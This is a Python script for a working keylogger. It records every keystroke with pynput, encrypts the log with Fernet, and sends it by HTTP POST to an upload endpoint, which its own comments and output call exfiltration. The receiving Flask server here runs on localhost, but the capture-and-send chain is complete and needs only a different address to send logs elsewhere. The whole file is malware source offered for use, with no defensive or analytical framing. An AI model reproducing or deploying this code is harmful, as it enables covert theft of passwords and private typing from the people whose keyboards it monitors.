from pynput import keyboard
from cryptography.fernet import Fernet
import os
import requests
import subprocess
import threading
import time
from flask import Flask, request

app = Flask(__name__)

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    file.save("received_logs.txt")
    return "File received", 200

def run_flask():
    app.run(port=5000)


def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as f:
        f.write(key)

def encrypt_log():
    if not os.path.exists("key.key"):
        generate_key()
    with open("key.key", "rb") as f:
        key = f.read()
    fernet = Fernet(key)
    with open("log.txt", "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open("log_encrypted.txt", "wb") as f:
        f.write(encrypted)


def exfiltrate():
    time.sleep(2)  # Give server time to start
    with open("log_encrypted.txt", "rb") as f:
        files = {"file": f}
        try:
            response = requests.post("http://127.0.0.1:5000/upload", files=files)
            print("Exfiltration Status:", response.status_code, response.text)
        except:
            print("Failed to send file to server.")


def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(f"[{key.name}]")

    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger started. Press ESC to exit and trigger encryption + exfiltration.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print("Encrypting logs...")
    encrypt_log()

    print("Starting local Flask server...")
    server_thread = threading.Thread(target=run_flask)
    server_thread.daemon = True
    server_thread.start()

    print("Sending encrypted logs to server...")
    exfiltrate()

if __name__ == "__main__":
    main()
